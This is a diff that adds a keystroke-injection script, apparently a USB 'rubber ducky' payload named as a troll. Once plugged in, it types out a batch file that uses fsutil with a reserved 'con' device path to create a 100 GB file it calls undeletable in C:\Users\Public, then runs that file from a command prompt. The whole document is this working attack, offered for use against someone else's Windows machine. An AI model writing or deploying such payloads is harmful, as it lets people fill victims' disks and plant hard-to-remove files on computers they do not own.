@@ -1,0 +1,23 @@
+REM Generates a 100gb undeletable file on an unpatched windows 10 or 11 system.
+DEFULT_DELAY 250
+GUI
+STRING notepad
+ENTER
+CTRL n
+STRING fsutil file createnew "\\.\C:/Users/Public/con.txt" 107374182400
+ENTER
+STRING confile created
+CTRL s
+STRING troll.bat
+ALT d
+STRING C:\Users\Public
+ENTER
+ENTER
+GUI
+STRING cmd
+ENTER
+STRING cd C:\Users\Public
+ENTER
+STRING troll.bat
+ENTER
+
